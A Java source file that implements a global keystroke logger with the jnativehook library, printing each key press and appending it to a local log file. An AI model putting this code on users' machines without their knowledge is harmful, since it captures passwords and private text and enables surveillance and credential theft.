package ainaa.acup.execution;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger extends KeyLoggerStart implements NativeKeyListener {

	
	private FileWriter fileWriter = null;
	private String initData;
	private BufferedWriter bufferedWriter = null;
	private File file =null;
	public KeyLogger(File file, String date) throws IOException {
 				this.file = file;
 				initData = "/*/*/*  ACUP key logs --- "+date+"   */*/*/\n";
 				fileWriter  = new FileWriter(this.file);
 				bufferedWriter = new BufferedWriter(fileWriter);
 				bufferedWriter.write(initData);
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		 System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));
		 if(bufferedWriter == null)
		 {
			 System.out.println(bufferedWriter);
		 }
		try {
				bufferedWriter.write(NativeKeyEvent.getKeyText(arg0.getKeyCode())+"  ");
				bufferedWriter.flush();
			} catch (IOException e1) {
				e1.printStackTrace();
			}
	}
	
	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
	}
	
	@Override
	protected void finalize() throws Throwable {
		// TODO Auto-generated method stub
		super.finalize();
		if(null != bufferedWriter)
		{
			bufferedWriter.close();
		}
		if(null != fileWriter)
		{
			fileWriter.close();
		}
	}

}
